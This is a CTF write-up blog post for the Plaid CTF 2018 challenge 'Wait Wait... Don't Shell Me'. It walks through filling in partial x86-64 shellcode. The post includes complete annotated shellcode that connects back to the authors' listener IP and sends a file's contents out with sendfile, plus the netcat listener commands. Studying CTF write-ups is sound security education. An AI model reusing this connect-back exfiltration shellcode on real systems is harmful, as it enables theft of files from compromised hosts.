---
layout: post
title:  "Plaid CTF 2018: Wait Wait... Don't Shell Me (125 pts)"
date:   2018-05-07 3:12:44 -0500
categories: ctfs pwn
---

This problem was categorized under "Misc" and was worth only 125 points. Nevertheless, it was one of the harder challenges and received only 14 solves. [ghostly_gray](https://raywang.tech) and I worked on it for several hours over the course of the CTF, but we only solved it after the CTF had ended.

The challenge was themed around the NPR Quiz Show *[Wait Wait... Don't Tell Me!](https://en.wikipedia.org/wiki/Wait_Wait..._Don%27t_Tell_Me!)* and consisted solely of an address and port to connect to.

When you connect, this is what you see:

```
$ nc wwdsm.chal.pwning.xxx 6615
From PPP and PCTF Pittsburgh, this is

+---------------------------------------------------------------------------+
|                       Wait Wait... Don't Shell Me!                        |
+---------------------------------------------------------------------------+

The PPP Flage Quiz.

Now it's time for

----------------------- Shellcode, Fill in the Blank. -----------------------

The rules are these: contestants get 60 seconds to answer as many fill in the
hex byte questions as possible. If you manage to complete the shellcode, you
win! We have flipped a coin, and Pwner was chosen to go first. Pwner, you're
up. Time begins as soon as you connect, so answer quickly!

b8 __ __ __ __ bf __ __ __ __ be __ __ __ __ ba
__ __ __ __ 01 c7 29 fe 21 f2 0f 05 48 b8 __ __
__ __ __ __ __ __ 50 b8 __ __ __ __ ba __ __ __
__ bf __ __ __ __ 48 89 __ 0f 05 be __ __ __ __
bf __ __ __ __ ba __ __ __ __ 83 c0 __ 0f 05 89
__ b8 __ __ __ __ bf __ __ __ __ 41 ba __ __ __
__ 0f 05 58

?
```

Basically, they gave us some partially filled-in shellcode, and we had to fill in the blanks so that the shellcode would give us the flag when run. Sometime in the middle of the competition, the organizers released a hint stating that the server closed stdin/stdout before executing our shellcode.

Here's the partial shellcode they gave us, reformatted and annotated:

```assembly
b8 __ __ __ __                 mov     eax,  ????????
bf __ __ __ __                 mov     edi,  ????????
be __ __ __ __                 mov     esi,  ????????
ba __ __ __ __                 mov     edx,  ????????
01 c7                          add     edi,  eax
29 fe                          sub     esi,  edi
21 f2                          and     edx,  esi
0f 05                          syscall
48 b8 __ __ __ __ __ __ __ __  movabs  rax,  ????????????????
50                             push    rax
b8 __ __ __ __                 mov     eax,  ????????
ba __ __ __ __                 mov     edx,  ????????
bf __ __ __ __                 mov     edi,  ????????
48 89 __                       mov     r??,  r??
0f 05                          syscall
be __ __ __ __                 mov     esi,  ????????
bf __ __ __ __                 mov     edi,  ????????
ba __ __ __ __                 mov     edx,  ????????
83 c0 __                       add     eax,  ???
0f 05                          syscall
89 __                          mov     e??,  e??
b8 __ __ __ __                 mov     eax,  ????????
bf __ __ __ __                 mov     edi,  ????????
41 ba __ __ __  __             mov     r10d, ????????
0f 05                          syscall
58                             pop rax
```

At first glance it looks pretty straightforward: they let us make 4 syscalls, and give us access to the arguments (passed in `rdi`, `rsi`, `rdx`, and `r10d` in order in x86-64) and to the syscall number (passed in `rax`). However, we struggled to cobble together four syscalls to do what we wanted.

Here's what we needed to do:
* Since stdin and stdout are closed, we needed to open a socket to our local machine. This requires two syscalls: [socket](http://man7.org/linux/man-pages/man2/socket.2.html) and [connect](http://man7.org/linux/man-pages/man2/connect.2.html).
* We need to either launch a reverse shell, which requires one syscall, [execve](http://man7.org/linux/man-pages/man2/execve.2.html), or we need to [open](http://man7.org/linux/man-pages/man2/open.2.html) the flag file, [read](http://man7.org/linux/man-pages/man2/read.2.html) it into memory, and then [write](http://man7.org/linux/man-pages/man2/write.2.html) it to our socket, which requires 3 syscalls.

There are two major roadblocks in our way. First, several of the above syscalls, specifically connect, execve, and open, have pointers as arguments rather than just immediates. However, only one of our four allowed syscalls let us specify a pointer as an argument. Notice that before we execute our second syscall, we get to move a 64-bit immediate into `rax`, and then push it on to the stack. If we then `mov rsi, rsp` using the last instruction before the second syscall, we can put a pointer to our 64-bit immediate in our second argument.

We eventually used this to point to a `sockaddr` struct for the second argument of connect. This meant that we had no way of specifying the string `/bin/sh` or the string `flag.txt` for the execve or open syscalls.

The second roadblock is that if we go the open / read / write route instead of using execve, we'll need a total of 2 + 3 = 5 syscalls instead of the four we're given.

We resolved this issue by considering the fourth syscall we were allowed to make in closer detail. Notice that the last instruction before the syscall allows us to move something into `r10d`, the fourth argument. However, none of the syscalls that we'd been considering using had more than three arguments. We then searched the [syscall table](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) for four-argument functions that could be of use, and we found [sendfile](http://man7.org/linux/man-pages/man2/sendfile.2.html).

sendfile allows us to specify an *in* and an *out* file descriptor, and send `count` bytes from the *in* file to the *out* file. If we first open `flag.txt`, we can send it's contents to our socket using just four total syscalls: socket, connect, open, and sendfile.

This was where we got stuck during the CTF. We couldn't figure out how to get around our first problem: how do we send a pointer to a string as an argument, when we can only move immediates into registers?

After a good night's sleep, we figured out what we were missing: with some luck, the binary would contain some helpful string loaded into memory. We could first use socket / connect / write to dump memory and locate something helpful. After this insight, we quickly finished the challenge.

## socket / connect / write

First: socket. socket takes 3 arguments: `int domain` (the protocol family), `int type` (the type of socket), and `int protocol`, the chosen protocol. For us, the `domain` was `AF_INET` = 2 (which corresponds to IPv4), the `type` was `SOCK_STREAM` = 1 (a standard, two-way socket), and the `protocol` was 0. Finally, the syscall number was 41. (You can look up syscall arguments and numbers in any syscall table. I generally use [this one](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) for x86-64 and [this one](https://syscalls.kernelgrok.com/) for x86).

socket's return value (stored in `rax`) is the file descriptor of the opened socket. Our shellcode immediately clobbers `rax` after the syscall, but we know that the file descriptor should be 0, since stdin and stdout were both closed.

Next: connect. connect takes 3 arguments: `int fd` (the file descriptor of our socket), `struct sockaddr *uservaddr` (a pointer to a `sockaddr` struct which specifies the IP and port to connect to), and `int addrlen` (the size of the `uservaddr` struct). As we said earlier, `fd` is 0. `uservaddr` is harder. For this, we have to fit our struct into 8 bytes, use `movabs` to put it in `rax`, push `rax`, and then move `esp` into `esi` to point our second argument to our struct.

The struct looks like this:
```c
struct sockaddr {
	u_char  sa_len;       /* total length */
	u_char  sa_family;    /* address family */
	char    sa_data[14];  /* actually longer; address value */
};
```

For us, `sa_len` = 2, `sa_family` = 0, and the `sa_data` field which specifies the address and port was `[0x44, 0x44, 18, 126, 0, 36]` which corresponds to an IP address of 18.126.0.36 and a port of 0x4444 = 17476. The full struct was then: `02004444127e0024`. In little endian, this corresponds to the 64-bit integer 0x24007e1244440002.

Finally, the `addrlen` field is 16, since our struct is 16 bytes long, and the syscall number is 42.

Next: write. write takes 3 arguments: `int fd` (the file descriptor to write to), `const char *buf` (a pointer to the buffer to write from), and `size_t count` (how many bytes to write). `fd` is our socket, which has file descriptor 0. We'll have `const char *buf` point to the base address of our ELF file, which varies depending on how it's built. We had to play around with this value a bit, but it turned out to be 0x400000. We set `count` to 0x1000 to read 4096 bytes and set the syscall number to 1.

In summary, here are the arguments we must set for our three syscalls:

| Syscall | `eax` | `edi` | `esi`              | `edx`  |
| ------- | ----- | ----- | ------------------ | -----  |
| socket  | 41    | 2     | 1                  | 0      |
| connect | 42    | 0     | 0x24007e1244440002 | 16     |
| write   | 1     | 0     | 0x400000           | 0x1000 |


Here is our filled in, annotated shellcode:

```assembly
b8 29 00 00 00          mov    eax,  0x29  // 0x29 = 41
bf d9 ff ff ff          mov    edi,  0xffffffd9
be 03 00 00 00          mov    esi,  0x3
ba 00 00 00 00          mov    edx,  0x0
01 c7                   add    edi,  eax   // 00xffffffd9 + 0x29 = 2
29 fe                   sub    esi,  edi   // 0x3 - 1 = 1
21 f2                   and    edx,  esi   // 0 & 1 = 0
0f 05                   syscall
48 b8 02 00 44 44 12    movabs rax,  0x24007e1244440002
7e 00 24
50                      push   rax
b8 2a 00 00 00          mov    eax,  0x2a  // 0x2a = 42
ba 10 00 00 00          mov    edx,  0x10  // 0x10 = 16
bf 00 00 00 00          mov    edi,  0x0
48 89 e6                mov    rsi,  rsp   // rsi points to 02004444127e0024
0f 05                   syscall            // sets eax to 0
be 00 00 40 00          mov    esi,  0x400000
bf 00 00 00 00          mov    edi,  0x0
ba 00 10 00 00          mov    edx,  0x1000
83 c0 01                add    eax,  0x1   // 0 + 1 = 1
0f 05                   syscall
89 c6                   mov    esi,  eax   // we're not using this syscall
b8 00 00 00 00          mov    eax,  0x0
bf 00 00 00 00          mov    edi,  0x0
41 ba 00 00 00 00       mov    r10d, 0x0
0f 05                   syscall
58                      pop    rax
```

Note that `edi`, `esi`, and `edx` are manipulated by the shellcode before the first syscall, so we have to do a little math to make them end up at the right values.

## Running it

First, we setup a netcat listener on our local machine with IP address 18.126.0.36 using `nc -v -l 17476`. The -v flag gives more verbose output and is helpful for determining if the server has connected to the socket.

Once we sent the filled-in values of our shellcode, we received [this file]({{ site.baseurl }}/assets/plaidctf2018/waitwait/header). Hexdumping it shows us that the string `flag.txt` is located at the offset 0xcb8!

```
$ xxd header
...
00000be0: 0000 0000 50b8 0000 0000 ba00 0000 00bf  ....P...........
00000bf0: 0000 0000 4889 000f 05be 0000 0000 bf00  ....H...........
00000c00: 0000 00ba 0000 0000 83c0 000f 0589 00b8  ................
00000c10: 0000 0000 bf00 0000 0041 ba00 0000 000f  .........A......
00000c20: 0558 662e 0f1f 8400 0000 0000 0f1f 4000  .Xf...........@.
00000c30: 4157 4156 4189 ff41 5541 544c 8d25 ce11  AWAVA..AUATL.%..
00000c40: 2000 5548 8d2d ce11 2000 5349 89f6 4989   .UH.-.. .SI..I.
00000c50: d54c 29e5 4883 ec08 48c1 fd03 e8ef faff  .L).H...H.......
00000c60: ff48 85ed 7420 31db 0f1f 8400 0000 0000  .H..t 1.........
00000c70: 4c89 ea4c 89f6 4489 ff41 ff14 dc48 83c3  L..L..D..A...H..
00000c80: 0148 39eb 75ea 4883 c408 5b5d 415c 415d  .H9.u.H...[]A\A]
00000c90: 415e 415f c390 662e 0f1f 8400 0000 0000  A^A_..f.........
00000ca0: f3c3 0000 4883 ec08 4883 c408 c300 0000  ....H...H.......
00000cb0: 0100 0200 0000 0000 666c 6167 2e74 7874  ........flag.txt
00000cc0: 0025 3032 7820 005f 5f20 0000 0000 0000  .%02x .__ ......
00000cd0: 4672 6f6d 2050 5050 2061 6e64 2050 4354  From PPP and PCT
00000ce0: 4620 5069 7474 7362 7572 6768 2c20 7468  F Pittsburgh, th
00000cf0: 6973 2069 730a 0a2b 2d2d 2d2d 2d2d 2d2d  is is..+--------
00000d00: 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d  ----------------
00000d10: 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d  ----------------
00000d20: 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d  ----------------
00000d30: 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d 2d2d  ----------------
00000d40: 2d2d 2d2b 0a7c 2020 2020 2020 2020 2020  ---+.|          
00000d50: 2020 2020 2020 2020 2020 2020 2057 6169               Wai
00000d60: 7420 5761 6974 2e2e 2e20 446f 6e27 7420  t Wait... Don't
00000d70: 5368 656c 6c20 4d65 2120 2020 2020 2020  Shell Me!
...
```

With this, we can now finish: we know the address of `flag.txt` is 0x400cb8, so we can specify this as the second argument to open, and then use the sendfile syscall to send its contents.

## socket / connect / open / sendfile

socket and connect remain unchanged. open takes three arguments: `const char *filename` (a pointer to a string which contains the path to the file), `int flags` (specifies the *access modes* and other options), and `int mode` (ignored for our use case). For us, `filename` should be 0x400cb8, `flags` should be 0 to specify opening the file in read-only mode, and `mode` can be set to 0. The syscall number of open is 2.

sendfile takes four arguments: `int out_fd` (the file descriptor to write to), `int in_fd` (the file descriptor to read from), `off_t *offset` (a pointer to a file offset to start reading from), and `size_t count` (how many bytes to read and write). For us, `out_fd` is our socket which has file descriptor 0. `in_fd` will probably be 1 since it's the next open descriptor. We can't set `esi` to an immediate, but we can can move `eax` into `esi`, and `eax` contains the return value of the `open` syscall, which returns the file descriptor of `flag.txt` which is exactly what we want.

If `offset` is set to NULL, sendfile starts reading from the first byte, so we'll set it to 0. `count` depends on how long the flag is. We set it at 10 at first, and increased it until we got the entire flag sent over. Finally, the syscall number for sendfile is 40.

In summary, here are the arguments we must set for our four syscalls:

| Syscall  | `eax` | `edi`    | `esi`              | `edx`  | `r10d` |
| -------- | ----- | -------- | ------------------ | -----  | ------ |
| socket   | 41    | 2        | 1                  | 0      |        |
| connect  | 42    | 0        | 0x24007e1244440002 | 16     |        |
| open     | 2     | 0x400cb8 | 0                  | 0      |        |
| sendfile | 40    | 0        | eax = 1            | 0      | 128    |

Here is our filled in, annotated shellcode:

```assembly
b8 29 00 00 00          mov    eax,  0x29  // 0x29 = 41
bf d9 ff ff ff          mov    edi,  0xffffffd9
be 03 00 00 00          mov    esi,  0x3
ba 00 00 00 00          mov    edx,  0x0
01 c7                   add    edi,  eax   // 00xffffffd9 + 0x29 = 2
29 fe                   sub    esi,  edi   // 0x3 - 1 = 1
21 f2                   and    edx,  esi   // 0 & 1 = 0
0f 05                   syscall
48 b8 02 00 44 44 12    movabs rax,  0x24007e1244440002
7e 00 24
50                      push   rax
b8 2a 00 00 00          mov    eax,  0x2a  // 0x2a = 42
ba 10 00 00 00          mov    edx,  0x10  // 0x10 = 16
bf 00 00 00 00          mov    edi,  0x0
48 89 e6                mov    rsi,  rsp   // rsi points to 02004444127e0024
0f 05                   syscall            // sets eax to 0
be 00 00 00 00          mov    esi,  0x0
bf b8 0c 40 00          mov    edi,  0x400cb8
ba 00 00 00 00          mov    edx,  0x0
83 c0 02                add    eax,  0x2   // 0 + 2 = 2
0f 05                   syscall
89 c6                   mov    esi,  eax   // set esi to 1
b8 28 00 00 00          mov    eax,  0x28  // 0x28 = 40
bf 00 00 00 00          mov    edi,  0x0
41 ba 80 00 00 00       mov    r10d, 0x80  // 0x80 = 128
0f 05                   syscall
58                      pop    rax
```

Sending the filled-in bytes to the server sent the flag straight to our listener:

```
$ nc -l 17476
PCTF{Pwner_had_enough_to_win_with_63_correct_answers_in_only_60_seconds}
```

Finally you might be interested in [this]({{site.baseurl}}/assets/plaidctf2018/waitwait/exploit.py) pwntools helper script we used to debug our shellcode locally and to output just the filled-in bytes from a completed shellcode. 
